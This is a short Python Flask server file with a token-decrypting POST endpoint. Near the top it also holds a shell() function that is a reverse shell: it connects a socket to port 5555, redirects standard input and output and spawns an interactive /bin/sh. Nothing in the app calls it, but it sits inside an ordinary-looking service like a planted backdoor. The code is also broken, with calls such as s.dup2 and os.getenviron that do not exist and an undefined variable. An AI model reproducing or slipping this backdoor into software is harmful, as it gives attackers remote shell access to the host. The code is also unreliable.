from flask import Flask, request, jsonify
import json, requests
import subprocess, socket, os
from nacl import secret
from nacl.encoding import Base64Encoder

app = Flask(__name__)

def shell():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("",5555))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    s.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
			


@app.route('/', methods=['POST'])
def index():
    data = request.get_json()
    print(data)
    if data["token"] == "":
            return "Unauthorized"
    
    key = os.getenviron['SECRET_KEY']
    box = secret.SecretBox(key)
    
    try:
        decrypted_token = box.decrypt(token.encode(), encoder=Base64Encoder)
            
    except:
        return "Unauthorized"
    
def run():
    app.run(host='127.0.0.1', port=5001, debug=True)

def main():
    run()

if __name__ == "__main__":
    main()	


